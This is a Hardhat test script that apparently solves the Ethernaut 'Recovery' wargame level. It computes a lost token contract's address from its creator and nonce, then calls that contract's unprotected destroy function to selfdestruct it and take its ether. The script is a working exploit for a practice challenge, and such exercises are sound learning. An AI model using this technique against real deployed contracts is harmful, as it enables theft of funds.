const { assert } = require("chai")
const { ethers, waffle } = require("hardhat")
require("dotenv").config()

const provider = waffle.provider

let player, challenge, challengeAddress, tx

beforeEach(async () => {
    accounts = await ethers.getSigners()
    player = accounts[0]

    challengeAddress = process.env.CHALLENGEADDRESS17 //address of my instance contract
    const challengeFactory = await ethers.getContractFactory(`Recovery`)
    challenge = await challengeFactory.attach(challengeAddress)
})

it("Solves the challenge 'Recovery'", async () => {
    /*To recover address of this contract we
    will use dedicated function. This function
    needs address of contract which created this searched
    and nonce. Because we are looking for the first created 
    Simple Token contract, the nonce = 1.  */
    const SimpleTokenAddress = ethers.utils.getContractAddress({
        from: challenge.address,
        nonce: 1,
    })

    const challengeFactory = await ethers.getContractFactory(`SimpleToken`)
    let simpleToken = await challengeFactory.attach(SimpleTokenAddress)

    tx = await simpleToken.destroy(player.address)
    await tx.wait(1)

    /*Function getCode get the code of the contract
    from the blockchain. If the contract doesn't exist
    the result will be 0x. */
    code = await provider.getCode(SimpleTokenAddress)
    assert(code == '0x', "SimpleToken contract is not destroyed")
})
